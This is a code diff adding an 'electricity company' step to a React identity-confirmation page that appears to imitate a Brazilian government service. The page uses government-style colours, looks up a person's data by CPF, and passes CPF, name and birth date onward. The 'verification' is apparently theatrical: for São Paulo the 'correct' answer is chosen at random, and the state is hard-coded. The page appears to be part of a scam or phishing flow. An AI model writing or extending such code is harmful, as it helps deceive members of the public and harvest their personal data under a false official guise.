@@ -18,6 +18,7 @@ import { apiRequest } from "@/lib/queryClient";
 enum EtapaVerificacao {
   NOME = 0,
   ANO_NASCIMENTO = 1,
+  COMPANHIA_ELETRICA = 2,
 }
 
 // Definir o esquema de validação para o formulário
@@ -29,8 +30,69 @@ const anoSchema = z.object({
   ano: z.string().min(1, "Selecione uma opção"),
 });
 
+const companhiaSchema = z.object({
+  companhia: z.string().min(1, "Selecione uma opção"),
+});
+
 type NomeFormValues = z.infer<typeof nomeSchema>;
 type AnoFormValues = z.infer<typeof anoSchema>;
+type CompanhiaFormValues = z.infer<typeof companhiaSchema>;
+
+// Lista de companhias elétricas por estado
+const companhiasEletricas: Record<string, string[]> = {
+  "São Paulo": [
+    "Enel Distribuição São Paulo",
+    "EDP São Paulo",
+    "CPFL Paulista",
+    "CPFL Piratininga",
+    "Neoenergia Elektro",
+    "ISA Energia Brasil"
+  ],
+  "Rio de Janeiro": [
+    "Enel Distribuição Rio",
+    "Light S/A"
+  ],
+  "Rio Grande do Sul": [
+    "CPFL Rio Grande Energia (RGE)",
+    "Equatorial CEEE"
+  ],
+  "Minas Gerais": [
+    "CEMIG Distribuição"
+  ],
+  "Espírito Santo": [
+    "EDP Espírito Santo"
+  ],
+  "Bahia": [
+    "COELBA"
+  ],
+  "Ceará": [
+    "ENEL CE"
+  ],
+  "Pernambuco": [
+    "NEOENERGIA Pernambuco"
+  ],
+  "Goiás": [
+    "ENEL GO"
+  ],
+  "Mato Grosso": [
+    "Energisa Mato Grosso"
+  ],
+  "Mato Grosso do Sul": [
+    "Energisa Mato Grosso do Sul"
+  ],
+  "Santa Catarina": [
+    "CELESC"
+  ],
+  "Paraná": [
+    "COPEL"
+  ],
+  "Pará": [
+    "Equatorial Pará"
+  ],
+  "Amazonas": [
+    "Amazonas Energia"
+  ]
+};
 
 export default function ConfirmarIdentidade() {
   const [, navigate] = useLocation();
@@ -43,7 +105,10 @@ export default function ConfirmarIdentidade() {
   const [dadosPessoais, setDadosPessoais] = useState<any>(null);
   const [opcoesNome, setOpcoesNome] = useState<string[]>([]);
   const [opcoesAno, setOpcoesAno] = useState<string[]>([]);
+  const [opcoesCompanhia, setOpcoesCompanhia] = useState<string[]>([]);
   const [isLoading, setIsLoading] = useState<boolean>(false);
+  const [estado, setEstado] = useState<string>("Minas Gerais");
+  const [companhiaCorreta, setCompanhiaCorreta] = useState<string>("");
 
   // Formulário para seleção de nome
   const nomeForm = useForm<NomeFormValues>({
@@ -58,6 +123,14 @@ export default function ConfirmarIdentidade() {
     resolver: zodResolver(anoSchema),
     defaultValues: {
       ano: "",
+    },
+  });
+  
+  // Formulário para seleção de companhia elétrica
+  const companhiaForm = useForm<CompanhiaFormValues>({
+    resolver: zodResolver(companhiaSchema),
+    defaultValues: {
+      companhia: "",
     },
   });
 
@@ -191,33 +264,137 @@ export default function ConfirmarIdentidade() {
     }
   };
 
+  // Função para gerar opções de companhia elétrica com base no estado
+  const gerarOpcoesCompanhia = (estadoSelecionado: string) => {
+    setEstado(estadoSelecionado);
+    
+    // Buscar a(s) companhia(s) correta(s) para o estado
+    const companhiasDoEstado = companhiasEletricas[estadoSelecionado] || [];
+    
+    // Verificar se estamos tratando de um dos estados especiais
+    if (estadoSelecionado === "São Paulo") {
+      // São Paulo tem 6 opções, todas reais
+      setOpcoesCompanhia(companhiasDoEstado);
+      // Escolher uma aleatoriamente como correta para o usuário
+      const indiceAleatorio = Math.floor(Math.random() * companhiasDoEstado.length);
+      setCompanhiaCorreta(companhiasDoEstado[indiceAleatorio]);
+      return;
+    }
+    
+    if (estadoSelecionado === "Rio de Janeiro" || estadoSelecionado === "Rio Grande do Sul") {
+      // Rio de Janeiro e Rio Grande do Sul têm 2 companhias reais e 1 aleatória
+      // Buscar uma companhia aleatória de outro estado
+      const todosEstados = Object.keys(companhiasEletricas);
+      const estadosComExcecao = todosEstados.filter(e => e !== estadoSelecionado);
+      const estadoAleatorio = estadosComExcecao[Math.floor(Math.random() * estadosComExcecao.length)];
+      const companhiasEstadoAleatorio = companhiasEletricas[estadoAleatorio] || [];
+      
+      if (companhiasEstadoAleatorio.length > 0) {
+        const companhiaAleatoria = companhiasEstadoAleatorio[0];
+        
+        // Embaralhar as opções
+        const opcoes = [...companhiasDoEstado, companhiaAleatoria];
+        const embaralharArray = (array: string[]): string[] => {
+          const arrayCopia = [...array];
+          for (let i = arrayCopia.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [arrayCopia[i], arrayCopia[j]] = [arrayCopia[j], arrayCopia[i]];
+          }
+          return arrayCopia;
+        };
+        
+        setOpcoesCompanhia(embaralharArray(opcoes));
+        
+        // Escolher uma companhia do estado como correta
+        const indiceAleatorio = Math.floor(Math.random() * companhiasDoEstado.length);
+        setCompanhiaCorreta(companhiasDoEstado[indiceAleatorio]);
+      }
+    } else {
+      // Para os outros estados, mostrar 1 companhia do estado e 2 aleatórias
+      if (companhiasDoEstado.length > 0) {
+        const companhiaCorretaEstado = companhiasDoEstado[0];
+        setCompanhiaCorreta(companhiaCorretaEstado);
+        
+        // Buscar 2 companhias aleatórias de outros estados
+        const todosEstados = Object.keys(companhiasEletricas);
+        const estadosComExcecao = todosEstados.filter(e => e !== estadoSelecionado);
+        
+        const companhiasAleatorias: string[] = [];
+        while (companhiasAleatorias.length < 2 && estadosComExcecao.length > 0) {
+          const estadoAleatorioIndex = Math.floor(Math.random() * estadosComExcecao.length);
+          const estadoAleatorio = estadosComExcecao[estadoAleatorioIndex];
+          
+          const companhiasEstadoAleatorio = companhiasEletricas[estadoAleatorio] || [];
+          if (companhiasEstadoAleatorio.length > 0) {
+            const companhiaAleatoria = companhiasEstadoAleatorio[0];
+            if (!companhiasAleatorias.includes(companhiaAleatoria)) {
+              companhiasAleatorias.push(companhiaAleatoria);
+            }
+          }
+          
+          // Remover este estado para não reutilizá-lo
+          estadosComExcecao.splice(estadoAleatorioIndex, 1);
+        }
+        
+        // Embaralhar as opções
+        const opcoes = [companhiaCorretaEstado, ...companhiasAleatorias];
+        const embaralharArray = (array: string[]): string[] => {
+          const arrayCopia = [...array];
+          for (let i = arrayCopia.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [arrayCopia[i], arrayCopia[j]] = [arrayCopia[j], arrayCopia[i]];
+          }
+          return arrayCopia;
+        };
+        
+        setOpcoesCompanhia(embaralharArray(opcoes));
+      }
+    }
+  };
+
   // Lidar com o envio do formulário de ano
   const onSubmitAno = (values: AnoFormValues) => {
     const dataNascimento = dadosPessoais?.Result?.DataNascimento || "";
     const anoCorreto = getAnoNascimento(dataNascimento);
     
     if (values.ano === anoCorreto) {
+      // Detectar estado - por padrão, usamos Minas Gerais para teste
+      const estadoSelecionado = "Minas Gerais";
+      
+      // Gerar opções de companhia com base no estado
+      gerarOpcoesCompanhia(estadoSelecionado);
+      
+      // Avançar para a próxima etapa
+      setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA);
+    } else {
+      toast({
+        title: "Ano incorreto",
+        description: "Por favor, selecione o ano correto do seu nascimento.",
+        variant: "destructive",
+      });
+    }
+  };
+  
+  // Lidar com o envio do formulário de companhia elétrica
+  const onSubmitCompanhia = (values: CompanhiaFormValues) => {
+    if (values.companhia === companhiaCorreta) {
       // Extrair dados para a próxima etapa
       const nome = dadosPessoais?.Result?.NomePessoaFisica || "";
       const dataNasc = formatarData(dadosPessoais?.Result?.DataNascimento || "");
-      
-      // Detectar o estado usando IP para uma experiência mais seamless
-      const estado = "Minas Gerais"; // Valor padrão, será escolhido pelo usuário na próxima etapa
-      const companhia = "CEMIG Distribuição"; // Valor padrão, será escolhido pelo usuário na próxima etapa
       
       const params = new URLSearchParams();
       params.append("cpf", cpf);
       params.append("nome", nome);
       params.append("nasc", dataNasc);
       params.append("estado", estado);
-      params.append("companhia", companhia);
+      params.append("companhia", companhiaCorreta);
       
       // Navegar para a página de resultado
       navigate(`/resultado?${params.toString()}`);
     } else {
       toast({
-        title: "Ano incorreto",
-        description: "Por favor, selecione o ano correto do seu nascimento.",
+        title: "Companhia incorreta",
+        description: "Por favor, selecione a companhia elétrica correta para o seu estado.",
         variant: "destructive",
       });
     }
@@ -328,6 +505,55 @@ export default function ConfirmarIdentidade() {
                               type="submit"
                               className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                               disabled={isLoading || !anoForm.watch("ano")}
+                            >
+                              <span>Prosseguir</span>
+                              <ArrowRight className="ml-2 h-5 w-5" />
+                            </Button>
+                          </div>
+                        </form>
+                      </Form>
+                    </div>
+                  )}
+                  
+                  {etapaAtual === EtapaVerificacao.COMPANHIA_ELETRICA && (
+                    <div>
+                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
+                        Agora, selecione a sua companhia elétrica entre as opções abaixo:
+                      </h2>
+                      
+                      <Form {...companhiaForm}>
+                        <form onSubmit={companhiaForm.handleSubmit(onSubmitCompanhia)} className="space-y-4">
+                          <FormField
+                            control={companhiaForm.control}
+                            name="companhia"
+                            render={({ field }) => (
+                              <FormItem className="space-y-4">
+                                <FormControl>
+                                  <RadioGroup
+                                    onValueChange={field.onChange}
+                                    value={field.value}
+                                    className="space-y-3"
+                                  >
+                                    {opcoesCompanhia.map((companhia, index) => (
+                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
+                                        <RadioGroupItem value={companhia} id={`companhia-${index}`} />
+                                        <Label htmlFor={`companhia-${index}`} className="flex-1 cursor-pointer">
+                                          {companhia}
+                                        </Label>
+                                      </div>
+                                    ))}
+                                  </RadioGroup>
+                                </FormControl>
+                                <FormMessage />
+                              </FormItem>
+                            )}
+                          />
+
+                          <div className="text-center mt-6">
+                            <Button 
+                              type="submit"
+                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
+                              disabled={isLoading || !companhiaForm.watch("companhia")}
                             >
                               <span>Prosseguir</span>
                               <ArrowRight className="ml-2 h-5 w-5" />
